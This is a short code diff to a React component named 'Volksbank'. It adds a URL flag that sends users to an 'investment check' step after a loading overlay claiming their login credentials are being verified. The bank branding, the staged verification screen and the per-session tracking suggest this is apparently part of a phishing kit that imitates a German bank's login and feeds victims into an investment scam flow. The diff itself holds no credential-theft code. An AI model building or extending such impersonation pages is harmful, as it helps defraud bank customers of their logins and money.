@@ -12,6 +12,7 @@ const Volksbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
+  const fromInvestmentCheck = searchParams.get("ic") === "1";
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
@@ -26,7 +27,7 @@ const Volksbank = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate(fromInvestmentCheck ? "/investmentcheck/start?step=3" : "/confirmation?s=" + sessionId)} />}
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
